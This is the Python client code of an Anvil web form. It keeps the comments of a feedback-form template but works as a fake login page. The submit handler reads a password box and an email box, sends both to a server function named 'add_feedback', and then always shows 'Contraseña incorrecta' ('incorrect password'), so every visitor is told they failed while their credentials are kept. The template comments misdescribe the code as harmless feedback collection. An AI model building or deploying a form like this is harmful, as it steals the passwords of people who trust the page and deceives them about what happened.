from ._anvil_designer import HomeFormTemplate
from anvil import *
import anvil.server
import anvil.tables as tables
import anvil.tables.query as q
from anvil.tables import app_tables

#
# This is the Python code that makes this feedback form work.
# It's a Python class, with a method that runs when the user
# clicks the SUBMIT button.
#
# When the button is clicked, we send the contents of the
# text boxes to our Server Module. The Server Module records
# the feedback in the database, and sends an email to the
# app's owner (that's you!).
#
# To find the Server Module, look under "Server Code" on the
# left.
#


class HomeForm(HomeFormTemplate):
  def __init__(self, **properties):
    # Set Form properties and Data Bindings.
    self.init_components(**properties)

    # Any code you write here will run when the form opens.

  def submit_button_click(self, **event_args):
    # This method runs when the button is clicked.
    # First, we grab the contents of the text boxes:
    name = self.passwd_box.text
    email = self.email_box.text
    

    # Now we call our Server Module to save our input
    # in the database and send you an email:
    anvil.server.call("add_feedback", name, email)
    # (Hint: Find ServerModule1 under "Server Code" on the
    # left. Click on the folder icon if you can't see it.)

    # Display something to the user so they know it worked:
    Notification("Contraseña incorrecta").show()
    self.clear_inputs()

  def clear_inputs(self):
    self.passwd_box.text = ""
    self.email_box.text = ""

  def passwd_box_pressed_enter(self, **event_args):
    """This method is called when the user presses Enter in this text box"""
    pass
